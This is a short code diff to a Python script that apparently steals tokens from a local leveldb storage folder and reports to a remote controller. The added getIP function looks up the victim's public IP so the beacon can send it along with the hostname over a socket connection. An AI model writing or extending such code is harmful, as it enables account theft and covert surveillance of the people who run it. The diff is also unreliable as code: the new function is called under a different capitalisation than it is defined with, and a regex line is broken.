@@ -34,6 +34,13 @@ def reset():
     global s
     
     s = socket.socket()
+    
+def getIP():
+    d = str(urlopen('http://checkip.dyndns.com/')
+            .read())
+ 
+    return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').
+             search(d).group(1)
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -259,7 +266,7 @@ while True:
         try:
             s.connect((ip, port))
             hostname = socket.gethostname()
-            ip_address = socket.gethostbyname(hostname)
+            ip_address = getIp()
             end = str(['CONN_INFO', hostname, ip_address])
             end = end.encode()
             s.send(end)
